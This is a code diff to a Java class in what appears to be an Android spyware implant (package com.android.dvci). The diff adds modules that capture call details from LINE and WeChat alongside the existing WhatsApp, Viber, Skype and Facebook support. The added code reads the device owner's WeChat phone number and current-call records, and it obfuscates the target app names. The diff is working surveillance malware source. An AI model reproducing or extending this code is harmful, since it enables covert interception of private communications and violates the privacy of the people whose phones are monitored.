@@ -3,6 +3,7 @@ package com.android.dvci.module.call;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.db.GenericSqliteHelper;
 import com.android.dvci.module.chat.ChatFacebook;
+import com.android.dvci.module.chat.ChatLine;
 import com.android.dvci.module.chat.ChatSkype;
 import com.android.dvci.module.chat.ChatViber;
 import com.android.dvci.module.chat.ChatWeChat;
@@ -152,6 +153,40 @@ public class CallInfo {
 
 			return ret;
 
+		} else if (this.programId == 0x014a) {
+			boolean ret = false;
+			this.processName = M.e("jp.naver.line.android");
+			this.delay = true;
+			this.realRate = true;
+
+			// open DB
+			if (end) {
+				//todo:fix this:
+				/*
+				String account = ChatLine.getAccount();
+				if(account.equals("") ){
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (updateCallInfo) failed to get account for line ");
+					}
+				}
+				this.account = account;
+				*/
+				this.account = "my account";
+				ret = ChatLine.getCurrentCall(this);
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (updateCallInfo) id: " + this.id);
+				}
+			} else {
+				this.account = M.e("delay");
+				this.peer = M.e("delay");
+				ret = true;
+			}
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " LINE (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
+			}
+			return ret;
+
 		} else if (this.programId == 0x0148) {
 			boolean ret = false;
 			this.processName = M.e("com.viber.voip");
@@ -183,7 +218,7 @@ public class CallInfo {
 
 			return ret;
 
-		}else if (this.programId == 0x014b) {
+		} else if (this.programId == 0x014b) {
 			if (end) {
 				return true;
 			}
@@ -203,8 +238,32 @@ public class CallInfo {
 			boolean ret = false;
 				ret = ChatWhatsapp.getCurrentCall(this);
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " WECHAT (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
+					Check.log(TAG + " WHATSAPP (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
 				}
+
+			return ret;
+		}else if (this.programId == 0x0149) {
+			if (end) {
+				return true;
+			}
+			this.processName = M.e("com.tencent.mm");
+			// open DB
+			String account = ChatWeChat.readMyPhoneNumber();
+			this.account = account;
+			this.delay = false;
+			this.realRate = true;
+
+			if(account == null){
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (update) ERROR, cannot read wechat account ");
+					return false;
+				}
+			}
+			boolean ret = false;
+			ret = ChatWeChat.getCurrentCall(this);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " WECHAT (updateCallInfo): id: " + this.id + " peer: " + this.peer + "returning:" + ret);
+			}
 
 			return ret;
 		}else if (this.programId == 0x014c) {
